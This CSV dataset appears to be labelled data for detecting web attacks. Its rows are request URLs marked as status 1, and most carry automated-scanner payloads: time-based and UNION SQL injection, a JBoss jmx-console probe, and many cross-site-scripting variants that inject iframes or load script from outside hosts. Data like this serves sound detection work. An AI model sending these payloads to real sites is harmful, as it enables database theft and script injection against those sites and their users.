request_url,status
/eap/17.news.commentlist?news_id=5198&news_id=5198&member_email=&member_annex_file=&comments_content=&is_open=0&member_id=&member_address=&member_phone=%20AND%20%28SELECT%20%2A%20FROM%20%28SELECT%28SLEEP%285%29%29%29PYdF%29,1
/eap/17.news.commentlist?news_id=5198&news_id=5198&member_email=&member_annex_file=&comments_content=&is_open=0&member_id=&member_address=&member_phone=%29%20AND%20%28SELECT%20%2A%20FROM%20%28SELECT%28SLEEP%285%29%29%29PYdF%29%20AND%20%282862%3D2862,1
/eap/17.news.commentlist?news_id=5198&news_id=5198&member_email=&member_annex_file=&comments_content=&is_open=0&member_id=&member_address=&member_phone=%20AND%205671%3D%28SELECT%20UPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28106%29%7C%7CCHR%28113%29%7C%7CCHR%28106%29%7C%7CCHR%28113%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%285671%3D5671%29%20THEN%201%20ELSE%200%20END%29%20FROM%20DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%2898%29%7C%7CCHR%28118%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%20FROM%20DUAL%29,1
/eap/17.news.commentlist?news_id=5198&news_id=5198&member_email=&member_annex_file=&comments_content=&is_open=0&member_id=&member_address=&member_phone=%20AND%202170%3D%28SELECT%202170%20FROM%20PG_SLEEP%285%29%29--%20DnPM,1
/jmx-console/HtmlAdaptor?action=inspectMBean&name=jboss.system:type%3DServer,1
/HBSC/Search/Result.jsp?button=??????&indexid=26&site=24&time=all&query=atestu%23%2A%2F--&#37;3E%27%22%29%3B&#37;3E&#37;3C%2Fscript&#37;3E&#37;3C%2Fstyle&#37;3E&#37;3C%2Ftitle&#37;3E&#37;3C%2Ftextarea&#37;3E&#37;3C%2Fframe&#37;3E&#37;3CFRAME+SRC%3D%22http%3A%2F%2Fwww.ejpmwfxq.com%2Fbdsnc.html%22&#37;3E&id=26,1
/index.php?m=wap&a=show&id=41890&catid=509%20AND%20%28SELECT%20%2A%20FROM%20%28SELECT%28SLEEP%285%29%29%29UGIf%29%23,1
/index.php?m=wap&a=show&id=41890&catid=509%25%27%20AND%20%28SELECT%20%2A%20FROM%20%28SELECT%28SLEEP%285%29%29%29ljYd%29%20AND%20%27%25%27%3D%27,1
/index.php?m=wap&a=show&id=41890&catid=509%20RLIKE%20%28SELECT%20%2A%20FROM%20%28SELECT%28SLEEP%285%29%29%29qdVm%29--%20GBmF,1
/index.php?m=wap&a=show&id=41890&catid=509%20RLIKE%20%28SELECT%20%2A%20FROM%20%28SELECT%28SLEEP%285%29%29%29qdVm%29%23%20HLCU,1
/index.php?m=wap&a=show&id=41890&catid=509%29%29%29%3B%28SELECT%20%2A%20FROM%20%28SELECT%28SLEEP%285%29%29%29tmRl%29%23,1
/index.php?m=wap&a=show&id=41890&catid=509%29%29%3B%28SELECT%20%2A%20FROM%20%28SELECT%28SLEEP%285%29%29%29tmRl%29%23,1
/index.php?m=wap&a=show&id=41890&catid=-1074%20UNION%20ALL%20SELECT%2078%2C78%2C78%2C78%2C78%2C78%2C78%2C78%2C78%2C78%2C78%2C78%2C78%2C78%2C78%2C78%2C78%2C78%2C78%2C78%2C78%2C78%2C78%2C78%2C78%2C78%2C78%2C78%2C78%23,1
/index.php?m=wap&a=show&id=41890&catid=-1501%20UNION%20ALL%20SELECT%2078%2C78%2C78%2C78%2C78%2C78%2C78%2C78%2C78%2C78%2C78%2C78%2C78%2C78%2C78%2C78%2C78%2C78%2C78%2C78%2C78%2C78%2C78%2C78%23,1
/index.php?m=wap&a=show&id=41890&catid=509%20AND%20%28SELECT%20%2A%20FROM%20%28SELECT%28SLEEP%285%29%29%29ljYd%29%23%20YYLL,1
/index.php?m=wap&a=show&id=41890&catid=509%25%22%20OR%20%28SELECT%20%2A%20FROM%20%28SELECT%28SLEEP%285%29%29%29iNEu%29%23,1
/HBSC/Services/zhujianju/Message_list.jsp?num=2%23%2A%2F--&#37;3E%27%22%29%3B&#37;3E&#37;3C%2Fscript&#37;3E&#37;3C%2Fstyle&#37;3E&#37;3C%2Ftitle&#37;3E&#37;3C%2Ftextarea&#37;3E&#37;3C%2Fiframe&#37;3E&#37;3CIFRAME+SRC%3D%22http%3A%2F%2Fwww.thsfprbj.com%2Fnwjft.html%22&#37;3E,1
/HBSC/Services/zhujianju/Message_write.jsp?num=1%23%2A%2F--&#37;3E%27%22%29%3B&#37;3E&#37;3C%2Fscript&#37;3E&#37;3C%2Fstyle&#37;3E&#37;3C%2Ftitle&#37;3E&#37;3C%2Ftextarea&#37;3E&#37;3C%2Fiframe&#37;3E&#37;3CIFRAME+SRC%3D%22http%3A%2F%2Fwww.pazmvwov.com%2Fqjajk.html%22&#37;3E&SiteID=1,1
/HBSC/Services/Counter.jsp?Type=Article&ID=586543%23%2A%2F--&#37;3E%27%22%29%3B&#37;3E&#37;3C%2Fiframe&#37;3E&#37;3C%2Fscript&#37;3E&#37;3C%2Fstyle&#37;3E&#37;3C%2Ftitle&#37;3E&#37;3C%2Ftextarea&#37;3E&#37;3Ca%20href%3D%27%2Fumsic.html%27&#37;3ELinkInjTest&#37;3C%2Fa&#37;3E,1
/HBSC/Services/zhujianju/Message_write.jsp?num=1%23%2A%2F--&#37;3E%27%22%29%3B&#37;3E&#37;3C%2Fscript&#37;3E&#37;3C%2Fstyle&#37;3E&#37;3C%2Ftitle&#37;3E&#37;3C%2Ftextarea&#37;3E&#37;3C%2Fframe&#37;3E&#37;3CFRAME+SRC%3D%22http%3A%2F%2Fwww.ktzywmjs.com%2Flokfr.html%22&#37;3E&SiteID=1,1
/HBSC/Services/zhongcaiwei/slmailbox.jsp?var=&#60;/script&#62;&#60;img%20src=pqhewm%20onerror=pqhewm(6144)&#62;,1
/HBSC/Search/Result.jsp?query=%253Catestu%253Exss%253C/atestu%253E&indexid=3&id=3&order=rela,1
/HBSC/Services/zhujianju/Message_list.jsp?SiteID=1&num=0,1
/HBSC/Services/Counter.jsp?Type=Article&ID=586543%23%2A%2F--&#37;3E%27%22%29%3B&#37;3E&#37;3C%2Fscript&#37;3E&#37;3C%2Fstyle&#37;3E&#37;3C%2Ftitle&#37;3E&#37;3C%2Ftextarea&#37;3E&#37;3C%2Fiframe&#37;3E&#37;3CIFRAME+SRC%3D%22http%3A%2F%2Fwww.oxymuadg.com%2Fdjdyx.html%22&#37;3E,1
/HBSC/Services/Counter.jsp?Type=Article%23%2A%2F--&#37;3E%27%22%29%3B&#37;3E&#37;3C%2Fscript&#37;3E&#37;3C%2Fstyle&#37;3E&#37;3C%2Ftitle&#37;3E&#37;3C%2Ftextarea&#37;3E&#37;3C%2Fframe&#37;3E&#37;3CFRAME+SRC%3D%22http%3A%2F%2Fwww.xfyutsgv.com%2Ftavxd.html%22&#37;3E&ID=586543,1
/HBSC/Services/zhujianju/Message_list.jsp?SiteID=1&num=0,1
/HBSC/Search/Result.jsp?query=atestu&indexid=3%23%2A%2F--&#37;3E%27%22%29%3B&#37;3E&#37;3C%2Fscript&#37;3E&#37;3C%2Fstyle&#37;3E&#37;3C%2Ftitle&#37;3E&#37;3C%2Ftextarea&#37;3E&#37;3C%2Fiframe&#37;3E&#37;3CIFRAME+SRC%3D%22http%3A%2F%2Fwww.dvowaleg.com%2Fqcovr.html%22&#37;3E&id=3&order=rela,1
/HBSC/Search/Result.jsp?query=atestu&indexid=3&id=3&order=rela%23%2A%2F--&#37;3E%27%22%29%3B&#37;3E&#37;3C%2Fiframe&#37;3E&#37;3C%2Fscript&#37;3E&#37;3C%2Fstyle&#37;3E&#37;3C%2Ftitle&#37;3E&#37;3C%2Ftextarea&#37;3E&#37;3Ca%20href%3D%27%2Fwzucg.html%27&#37;3ELinkInjTest&#37;3C%2Fa&#37;3E,1
/HBSC/Search/AdvanceResult.jsp?query=&#60;/script&#62;&#60;ScrIpt/pzlyox%20src=/106.187.100.180/eHNz.js?6414&#62;&#60;/ScRIpt&#62;&site=1,1
/HBSC/Search/Result.jsp?query=atestu%23%2A%2F--&#37;3E%27%22%29%3B&#37;3E&#37;3C%2Fscript&#37;3E&#37;3C%2Fstyle&#37;3E&#37;3C%2Ftitle&#37;3E&#37;3C%2Ftextarea&#37;3E&#37;3C%2Fframe&#37;3E&#37;3CFRAME+SRC%3D%22http%3A%2F%2Fwww.vfzyggjl.com%2Fxmkdl.html%22&#37;3E&indexid=3&id=3&time=week,1
/HBSC/Search/Result.jsp?query=&#60;/script&#62;&#60;ScrIpt/pzlyox%20src=/106.187.100.180/eHNz.js?6278&#62;&#60;/ScRIpt&#62;&indexid=3&site=1&id=0,1
/HBSC/Search/Result.jsp?query=atestu&indexid=3%23%2A%2F--&#37;3E%27%22%29%3B&#37;3E&#37;3C%2Fscript&#37;3E&#37;3C%2Fstyle&#37;3E&#37;3C%2Ftitle&#37;3E&#37;3C%2Ftextarea&#37;3E&#37;3C%2Fframe&#37;3E&#37;3CFRAME+SRC%3D%22http%3A%2F%2Fwww.zcvwypho.com%2Fvmmky.html%22&#37;3E&site=1&id=0,1
/HBSC/Search/Result.jsp?query=atestu&indexid=3&site=1&id=0%23%2A%2F--&#37;3E%27%22%29%3B&#37;3E&#37;3C%2Fscript&#37;3E&#37;3C%2Fstyle&#37;3E&#37;3C%2Ftitle&#37;3E&#37;3C%2Ftextarea&#37;3E&#37;3C%2Fiframe&#37;3E&#37;3CIFRAME+SRC%3D%22http%3A%2F%2Fwww.ghtebjos.com%2Folrlz.html%22&#37;3E,1
/HBSC/Search/Result.jsp?query=</script>[url=jav\\x61scr\\x69pt:pzlyox(6278)]6278[/url]&indexid=3&site=1&id=0,1
/HBSC/Search/Result.jsp?query=atestu&indexid=3&id=3%23%2A%2F--&#37;3E%27%22%29%3B&#37;3E&#37;3C%2Fscript&#37;3E&#37;3C%2Fstyle&#37;3E&#37;3C%2Ftitle&#37;3E&#37;3C%2Ftextarea&#37;3E&#37;3C%2Fframe&#37;3E&#37;3CFRAME+SRC%3D%22http%3A%2F%2Fwww.bkzjgqod.com%2Flmxzy.html%22&#37;3E&time=week,1
/HBSC/Services/AuthCode.jsp?Width=60%23%2A%2F--&#37;3E%27%22%29%3B&#37;3E&#37;3C%2Fiframe&#37;3E&#37;3C%2Fscript&#37;3E&#37;3C%2Fstyle&#37;3E&#37;3C%2Ftitle&#37;3E&#37;3C%2Ftextarea&#37;3E&#37;3Ca%20href%3D%27%2Fwgkjw.html%27&#37;3ELinkInjTest&#37;3C%2Fa&#37;3E&Height=18&1547035564413,1
/HBSC/Services/zhongcaiwei/slmailbox.jsp?&#60;/script&#62;&#60;img+src=pqhewm+onerror=pqhewm(6881)&#62;,1
/HBSC/Services/zhongcaiwei/slmailbox.jsp?var=&#60;/script&#62;&#60;audio%20src=pqhewm%20onerror=pqhewm(6144)&#62;,1
/HBSC/Search/Result.jsp?query=atestu&indexid=3&id=3&order=&#60;/script&#62;&#60;svg/%20onload=pzlyox(6418)&#62;,1
/HBSC/Services/zhongcaiwei/slmailbox.jsp?var=&#60;/script&#62;&#60;svg/%20onload=pqhewm(6144)&#62;,1
/HBSC/Services/AuthCode.jsp?Width=60%23%2A%2F--&#37;3E%27%22%29%3B&#37;3E&#37;3C%2Fscript&#37;3E&#37;3C%2Fstyle&#37;3E&#37;3C%2Ftitle&#37;3E&#37;3C%2Ftextarea&#37;3E&#37;3C%2Fiframe&#37;3E&#37;3CIFRAME+SRC%3D%22http%3A%2F%2Fwww.ojtvpsfm.com%2Fevups.html%22&#37;3E&Height=18&1547035564413,1
/HBSC/Services/AuthCode.jsp?Width=60&Height=18%23%2A%2F--&#37;3E%27%22%29%3B&#37;3E&#37;3C%2Fiframe&#37;3E&#37;3C%2Fscript&#37;3E&#37;3C%2Fstyle&#37;3E&#37;3C%2Ftitle&#37;3E&#37;3C%2Ftextarea&#37;3E&#37;3Ca%20href%3D%27%2Feltlm.html%27&#37;3ELinkInjTest&#37;3C%2Fa&#37;3E&1547035564413,1
/HBSC/Search/AdvanceResult.jsp?query=&#60;/script&#62;&#60;object+data=jav\\x61scr\\x69pt:pzlyox(6414)&#62;&site=1,1
/HBSC/Search/AdvanceResult.jsp?query=</script>[url=jav\\x61scr\\x69pt%26%23x3A;pzlyox(6414)]6414[/url]&site=1,1
/HBSC/Search/Result.jsp?query=&#60;/script&#62;&#60;img/%20src=pzlyox%20onerror=pzlyox(6278)&#62;&indexid=3&site=1&id=0,1
/HBSC/Search/Result.jsp?indexid=3&query=atestu&id=3&time=week,1
/HBSC/Search/Result.jsp?query=&#60;/script&#62;&#60;audio%20src=pzlyox%20onerror=pzlyox(6278)&#62;&indexid=3&site=1&id=0,1
/HBSC/Search/Result.jsp?indexid=3&query=atestu&id=3&time=week,1
/HBSC/Search/Result.jsp?query=</script>[url=jav\\x61scr\\x69pt:pzlyox(6347)]6347[/url]&indexid=3&id=3&time=week,1
/HBSC/Services/zhongcaiwei/slmailbox.jsp?var=&#60;/script&#62;&#60;img/%20src=pqhewm%20onerror=pqhewm(6144)&#62;,1
/HBSC/Services/zhongcaiwei/slmailbox.jsp?var=&#60;/script&#62;&#60;img+src=pqhewm+onerror=pqhewm(6144)&#62;,1
/HBSC/Services/czheagrigovcn/mailbox_article.jsp?ID=5531,1
/HBSC/Search/Result.jsp?query=atestu&indexid=3&id=3&time=&#60;/script&#62;&#60;img%20src=pzlyox%20onerror=pzlyox(6147)&#62;,1
/HBSC/Search/Result.jsp?query=&#60;atestu&#62;xss&#60;/atestu&#62;&indexid=3&id=3&time=week,1
/HBSC/Services/pdf/web/show.jsp?id=546481,1
/HBSC/Services/czheagrigovcn/Message_list.jsp?num=1,1
/HBSC/Services/czheagrigovcn/Message_list.jsp?SiteID=1&num=0,1
/HBSC/Services/gongxiaoshe/mailbox.jsp?&#60;/script&#62;&#60;audio%20src=pzlyox%20onerror=pzlyox(6447)&#62;,1
/HBSC/Services/pdf/web/show.jsp?id=546481%23%2A%2F--&#37;3E%27%22%29%3B&#37;3E&#37;3C%2Fscript&#37;3E&#37;3C%2Fstyle&#37;3E&#37;3C%2Ftitle&#37;3E&#37;3C%2Ftextarea&#37;3E&#37;3C%2Fiframe&#37;3E&#37;3CIFRAME+SRC%3D%22http%3A%2F%2Fwww.uxiwkojg.com%2Fwrhdv.html%22&#37;3E,1
/HBSC/Services/czheagrigovcn/Message_list.jsp?num=0%23%2A%2F--&#37;3E%27%22%29%3B&#37;3E&#37;3C%2Fscript&#37;3E&#37;3C%2Fstyle&#37;3E&#37;3C%2Ftitle&#37;3E&#37;3C%2Ftextarea&#37;3E&#37;3C%2Fiframe&#37;3E&#37;3CIFRAME+SRC%3D%22http%3A%2F%2Fwww.xcohuwvc.com%2Fprsdn.html%22&#37;3E&SiteID=1,1
/HBSC/Services/AttachDownLoad.jsp?id=593365%23%2A%2F--&#37;3E%27%22%29%3B&#37;3E&#37;3C%2Fiframe&#37;3E&#37;3C%2Fscript&#37;3E&#37;3C%2Fstyle&#37;3E&#37;3C%2Ftitle&#37;3E&#37;3C%2Ftextarea&#37;3E&#37;3Ca%20href%3D%27%2Fvsojf.html%27&#37;3ELinkInjTest&#37;3C%2Fa&#37;3E,1
/HBSC/Services/SitesStat.jsp?SiteID=46%23%2A%2F--&#37;3E%27%22%29%3B&#37;3E&#37;3C%2Fscript&#37;3E&#37;3C%2Fstyle&#37;3E&#37;3C%2Ftitle&#37;3E&#37;3C%2Ftextarea&#37;3E&#37;3C%2Fiframe&#37;3E&#37;3CIFRAME+SRC%3D%22http%3A%2F%2Fwww.cymzqflk.com%2Fkyoev.html%22&#37;3E,1
/HBSC/Services/pdf/web/show.jsp?id=546481%23%2A%2F--&#37;3E%27%22%29%3B&#37;3E&#37;3C%2Fscript&#37;3E&#37;3C%2Fstyle&#37;3E&#37;3C%2Ftitle&#37;3E&#37;3C%2Ftextarea&#37;3E&#37;3C%2Fframe&#37;3E&#37;3CFRAME+SRC%3D%22http%3A%2F%2Fwww.yhfviavj.com%2Fvqjmw.html%22&#37;3E,1
/HBSC/Search/AdvanceResult.jsp?query=&#60;/script&#62;&#60;iframe%20src=jav\\x61scr\\x69pt:pzlyox(6414)&#62;&site=1,1
/HBSC/Search/AdvanceResult.jsp?query=</script>[url=jav\\x61scr\\x69pt:pzlyox(6414)]6414[/url]&site=1,1
/HBSC/Services/pdf/web/show.jsp?id=559977%23%2A%2F--&#37;3E%27%22%29%3B&#37;3E&#37;3C%2Fscript&#37;3E&#37;3C%2Fstyle&#37;3E&#37;3C%2Ftitle&#37;3E&#37;3C%2Ftextarea&#37;3E&#37;3C%2Fframe&#37;3E&#37;3CFRAME+SRC%3D%22http%3A%2F%2Fwww.bgsdgcja.com%2Fhfwlp.html%22&#37;3E,1
/HBSC/Search/AdvanceResult.jsp?query=atestu&site=1%23%2A%2F--&#37;3E%27%22%29%3B&#37;3E&#37;3C%2Fscript&#37;3E&#37;3C%2Fstyle&#37;3E&#37;3C%2Ftitle&#37;3E&#37;3C%2Ftextarea&#37;3E&#37;3C%2Fiframe&#37;3E&#37;3CIFRAME+SRC%3D%22http%3A%2F%2Fwww.sthfmtso.com%2Fjmdzi.html%22&#37;3E,1
/HBSC/Services/czheagrigovcn/Message_write.jsp?SiteID=1&num=1,1
/HBSC/Services/pdf/web/show.jsp?id=546481,1
/HBSC/Services/czheagrigovcn/Message_article.jsp?messageID=9935,1
/HBSC/Services/gongxiaoshe/mailbox.jsp?var=&#60;/script&#62;&#60;iframe%20src=jav\\x61scr\\x69pt:pzlyox(6547)&#62;,1
/HBSC/Services/czfdagovcn/Message_write.jsp?num=1,1
/HBSC/Services/yunhe/mailbox.jsp?&#60;/script&#62;&#60;audio%20src=pzlyox%20onerror=pzlyox(6839)&#62;,1
/HBSC/Services/yunhe/mailbox.jsp?&#60;/script&#62;&#60;object+data=jav\\x61scr\\x69pt:pzlyox(6839)&#62;,1
/HBSC/Services/yunhe/mailbox.jsp?var=&#60;/script&#62;&#60;img/%20src=pzlyox%20onerror=pzlyox(6938)&#62;,1
/HBSC/Services/yunhe/mailbox.jsp?var=&#60;/script&#62;&#60;audio%20src=pzlyox%20onerror=pzlyox(6938)&#62;,1
/HBSC/Services/czfdagovcn/Message_write.jsp?num=1%23%2A%2F--&#37;3E%27%22%29%3B&#37;3E&#37;3C%2Fscript&#37;3E&#37;3C%2Fstyle&#37;3E&#37;3C%2Ftitle&#37;3E&#37;3C%2Ftextarea&#37;3E&#37;3C%2Fiframe&#37;3E&#37;3CIFRAME+SRC%3D%22http%3A%2F%2Fwww.tecxxpku.com%2Fyelhb.html%22&#37;3E,1
/HBSC/Services/czfdagovcn/Message_list.jsp?num=1%23%2A%2F--&#37;3E%27%22%29%3B&#37;3E&#37;3C%2Fiframe&#37;3E&#37;3C%2Fscript&#37;3E&#37;3C%2Fstyle&#37;3E&#37;3C%2Ftitle&#37;3E&#37;3C%2Ftextarea&#37;3E&#37;3Ca%20href%3D%27%2Fuikar.html%27&#37;3ELinkInjTest&#37;3C%2Fa&#37;3E&page=2,1
/HBSC/Services/zhongcaiwei/Message_list.jsp?num=1,1
/HBSC/Services/AuthCode.jsp?Height=18&Width=60,1
/HBSC/Search/Result.jsp?query=atestu&order=time&indexid=3&id=3&time=&#60;/script&#62;&#60;img/%20src=pzlyox%20onerror=pzlyox(6211)&#62;,1
/HBSC/Search/Result.jsp?query=&#60;/script&#62;&#60;object+data=jav\\x61scr\\x69pt:pzlyox(6009)&#62;&order=time&indexid=3&id=3&time=week,1
/HBSC/Search/Result.jsp?query=&#60;/script&#62;&#60;input%20autofocus%20onfocus=pzlyox(6009)&#62;&order=time&indexid=3&id=3&time=week,1
/HBSC/Search/AdvanceResult.jsp?startdate=2019-1-8&enddate=2019-1-8&title=atestu&author=atestu&site=1&content=atestu&query=&#60;/script&#62;&#60;iframe%20src=jav\\x61scr\\x69pt:pzlyox(6298)&#62;,1
/HBSC/Search/Result.jsp?query=&#60;/script&#62;&#60;img+src=pzlyox+onerror=pzlyox(6009)&#62;&order=time&indexid=3&id=3&time=week,1
/HBSC/Search/Result.jsp?query=&#60;/script&#62;&#60;ScrIpt/pzlyox%20src=/106.187.100.180/eHNz.js?6009&#62;&#60;/ScRIpt&#62;&order=time&indexid=3&id=3&time=week,1
/HBSC/Search/Result.jsp?query=&#60;/script&#62;&#60;iframe%20src=jav\\x61scr\\x69pt:pzlyox(6832)&#62;&time=month&indexid=3&MsgNumber=12345&id=3,1
/HBSC/Search/Result.jsp?query=atestu&time=month&indexid=3&MsgNumber=12345%23%2A%2F--&#37;3E%27%22%29%3B&#37;3E&#37;3C%2Fscript&#37;3E&#37;3C%2Fstyle&#37;3E&#37;3C%2Ftitle&#37;3E&#37;3C%2Ftextarea&#37;3E&#37;3C%2Fframe&#37;3E&#37;3CFRAME+SRC%3D%22http%3A%2F%2Fwww.wqsyyhvg.com%2Fbmcaz.html%22&#37;3E&id=3,1
/HBSC/Search/Result.jsp?query=</script>[url=jav\\x61scr\\x69pt:pzlyox(6276)]6276[/url]&order=time&indexid=3&MsgNumber=12345&id=3,1
/HBSC/Search/Result.jsp?query=atestu&order=&#60;/script&#62;&#60;object+data=jav\\x61scr\\x69pt:pzlyox(6169)&#62;&indexid=3&MsgNumber=12345&id=3,1
/HBSC/Search/Result.jsp?query=atestu&time=month&indexid=3%23%2A%2F--&#37;3E%27%22%29%3B&#37;3E&#37;3C%2Fscript&#37;3E&#37;3C%2Fstyle&#37;3E&#37;3C%2Ftitle&#37;3E&#37;3C%2Ftextarea&#37;3E&#37;3C%2Fframe&#37;3E&#37;3CFRAME+SRC%3D%22http%3A%2F%2Fwww.fkboqcjv.com%2Fabtuj.html%22&#37;3E&MsgNumber=12345&id=3,1
/HBSC/Search/Result.jsp?query=atestu&order=&#60;/script&#62;&#60;ScrIpt/pzlyox%20src=/106.187.100.180/eHNz.js?6169&#62;&#60;/ScRIpt&#62;&indexid=3&MsgNumber=12345&id=3,1
/HBSC/Search/Result.jsp?query=atestu&order=&#60;/script&#62;&#60;audio%20src=pzlyox%20onerror=pzlyox(6169)&#62;&indexid=3&MsgNumber=12345&id=3,1
/HBSC/Search/Result.jsp?query=atestu&time=month&indexid=3&MsgNumber=12345&id=3%23%2A%2F--&#37;3E%27%22%29%3B&#37;3E&#37;3C%2Fscript&#37;3E&#37;3C%2Fstyle&#37;3E&#37;3C%2Ftitle&#37;3E&#37;3C%2Ftextarea&#37;3E&#37;3C%2Fframe&#37;3E&#37;3CFRAME+SRC%3D%22http%3A%2F%2Fwww.zvjusoux.com%2Ffielt.html%22&#37;3E,1
/HBSC/Search/Result.jsp?query=atestu%23%2A%2F--&#37;3E%27%22%29%3B&#37;3E&#37;3C%2Fscript&#37;3E&#37;3C%2Fstyle&#37;3E&#37;3C%2Ftitle&#37;3E&#37;3C%2Ftextarea&#37;3E&#37;3C%2Fframe&#37;3E&#37;3CFRAME+SRC%3D%22http%3A%2F%2Fwww.phqvyzir.com%2Fglxqe.html%22&#37;3E&time=month&indexid=3&MsgNumber=12345&id=3,1
/HBSC/Search/Result.jsp?indexid=3&query=atestu&MsgNumber=12345&id=3&order=time,1
/HBSC/Services/kejiju/Message_article.jsp?messageID=14114%23%2A%2F--&#37;3E%27%22%29%3B&#37;3E&#37;3C%2Fscript&#37;3E&#37;3C%2Fstyle&#37;3E&#37;3C%2Ftitle&#37;3E&#37;3C%2Ftextarea&#37;3E&#37;3C%2Fframe&#37;3E&#37;3CFRAME+SRC%3D%22http%3A%2F%2Fwww.tnoakhrs.com%2Flkhcx.html%22&#37;3E,1
/HBSC/Search/Result.jsp?query=atestu&indexid=1234567890&site=33&Submit=%E6%90%9C%E7%B4%A2,1
/HBSC/Services/pdf/web/show.jsp?id=546821%23%2A%2F--&#37;3E%27%22%29%3B&#37;3E&#37;3C%2Fiframe&#37;3E&#37;3C%2Fscript&#37;3E&#37;3C%2Fstyle&#37;3E&#37;3C%2Ftitle&#37;3E&#37;3C%2Ftextarea&#37;3E&#37;3Ca%20href%3D%27%2Ftogwm.html%27&#37;3ELinkInjTest&#37;3C%2Fa&#37;3E,1
/HBSC/Search/Result.jsp?query=atestu&time=</script>[url=jav\\x61scr\\x69pt%26colon;pzlyox(6835)]6835[/url]&indexid=3&MsgNumber=12345&id=3,1
/HBSC/Search/Result.jsp?query=&#60;/script&#62;&#60;svg/%20onload=pzlyox(6832)&#62;&time=month&indexid=3&MsgNumber=12345&id=3,1
/HBSC/Services/yunhe/message.jsp?num=1&page=1,1
/HBSC/Search/Result.jsp?query=atestu&time=&#60;/script&#62;&#60;svg/%20onload=pzlyox(6835)&#62;&indexid=3&MsgNumber=12345&id=3,1
/HBSC/Services/yunhe/message.jsp?num=1&page=1,1
/HBSC/Search/Result.jsp?query=atestu&indexid=1234567890&site=33&Submit=%E6%90%9C%E7%B4%A2%23%2A%2F--&#37;3E%27%22%29%3B&#37;3E&#37;3C%2Fscript&#37;3E&#37;3C%2Fstyle&#37;3E&#37;3C%2Ftitle&#37;3E&#37;3C%2Ftextarea&#37;3E&#37;3C%2Fiframe&#37;3E&#37;3CIFRAME+SRC%3D%22http%3A%2F%2Fwww.hxjswbrx.com%2Flxbsp.html%22&#37;3E,1
/HBSC/Services/pdf/web/show.jsp?id=546821%23%2A%2F--&#37;3E%27%22%29%3B&#37;3E&#37;3C%2Fscript&#37;3E&#37;3C%2Fstyle&#37;3E&#37;3C%2Ftitle&#37;3E&#37;3C%2Ftextarea&#37;3E&#37;3C%2Fframe&#37;3E&#37;3CFRAME+SRC%3D%22http%3A%2F%2Fwww.mgdufdiz.com%2Fpcdhi.html%22&#37;3E,1
/HBSC/Search/AdvanceResult.jsp?startdate=2019-1-4%23%2A%2F--&#37;3E%27%22%29%3B&#37;3E&#37;3C%2Fscript&#37;3E&#37;3C%2Fstyle&#37;3E&#37;3C%2Ftitle&#37;3E&#37;3C%2Ftextarea&#37;3E&#37;3C%2Fiframe&#37;3E&#37;3CIFRAME+SRC%3D%22http%3A%2F%2Fwww.kehgevmu.com%2Fqineg.html%22&#37;3E&enddate=2019-1-4&title=atestu&author=atestu&site=24&content=atestu&query=atestu,1
/HBSC/Search/AdvanceResult.jsp?startdate=2019-1-4&enddate=2019-1-4&title=atestu&author=atestu%23%2A%2F--&#37;3E%27%22%29%3B&#37;3E&#37;3C%2Fiframe&#37;3E&#37;3C%2Fscript&#37;3E&#37;3C%2Fstyle&#37;3E&#37;3C%2Ftitle&#37;3E&#37;3C%2Ftextarea&#37;3E&#37;3Ca%20href%3D%27%2Fhzasx.html%27&#37;3ELinkInjTest&#37;3C%2Fa&#37;3E&site=24&content=atestu&query=atestu,1
/HBSC/Search/AdvanceResult.jsp?startdate=2019-1-4&enddate=2019-1-4&title=atestu&author=atestu&site=24&content=atestu&query=atestu%23%2A%2F--&#37;3E%27%22%29%3B&#37;3E&#37;3C%2Fscript&#37;3E&#37;3C%2Fstyle&#37;3E&#37;3C%2Ftitle&#37;3E&#37;3C%2Ftextarea&#37;3E&#37;3C%2Fiframe&#37;3E&#37;3CIFRAME+SRC%3D%22http%3A%2F%2Fwww.xatiqxas.com%2Fsrzlc.html%22&#37;3E,1
/HBSC/Services/huanbaoju/message_zx.jsp?&#60;/script&#62;&#60;audio%20src=sadmfo%20onerror=sadmfo(6485)&#62;,1
